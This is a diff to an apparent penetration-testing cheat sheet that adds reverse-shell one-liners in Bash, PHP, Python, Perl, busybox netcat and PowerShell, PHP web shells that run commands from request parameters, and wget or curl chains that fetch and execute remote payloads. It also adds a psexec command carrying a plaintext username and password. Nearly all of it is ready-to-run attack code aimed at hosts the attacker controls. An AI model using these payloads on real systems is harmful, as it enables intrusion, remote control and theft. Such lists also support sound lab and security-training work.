@@ -1,8 +1,41 @@
 =====================================================================================[+ BASH]
-bash -i >& /dev/tcp/192.168.45.163/80 0>&1
+bash -i >& /dev/tcp/192.168.45.187/8091 0>&1
 =====================================================================================
 [+ PHP]
-php -r '$sock=fsockopen("192.168.45.163", 443);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.45.187", 443);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+cp /usr/share/webshells/php/php-reverse-shell.php .
+mv php-reverse-shell.php shell.php
+python3 -m http.server
+nc -nlvp 443
+<?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
+
+cp /usr/share/webshells/php/php-reverse-shell.php .
+python3 -m http.server 800
+nc -nlvp 443
+&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php
+
+ &cmd=whoami or ?cmd=whoami
+<?php shell_exec($_GET["cmd"]);?>
+<?php system($_GET["cmd"]);?>
+<?php echo passthru($_GET['cmd']); ?>
+<?php echo exec($_POST['cmd']); ?>
+<?php system($_GET['cmd']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+
+cp /usr/share/webshells/php/php-reverse-shell.php .
+python3 -m http.server 800
+nc -nlvp 443
+&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php
+
+echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
+shell.php&cmd=
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+nc -nlvp 22
+or
+
+busybox nc $ip 5000 -e /bin/bash
 =====================================================================================
 [+ PYTHON]
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.163",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -16,3 +49,15 @@ perl -e 'use Socket:$i="192.168.45.163";$0=443;socket(S,PF INET,SOCK STREAM, get
 [+ CMD]
 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell 
 -noprofile'
+
+---
+
+General:
+
+- “Curl ip/reverse.sh | bash” not a bad idea.
+- wget'ing to tmp, chmod +x, then bash -c /tmp/pwn.sh
+- If you have creds and can't get psexec onto the box, try it locally to get a shell
+
+```bash
+proxychains psexec.py USERC:USERCishere@10.11.1.50 cmd.exe
+```
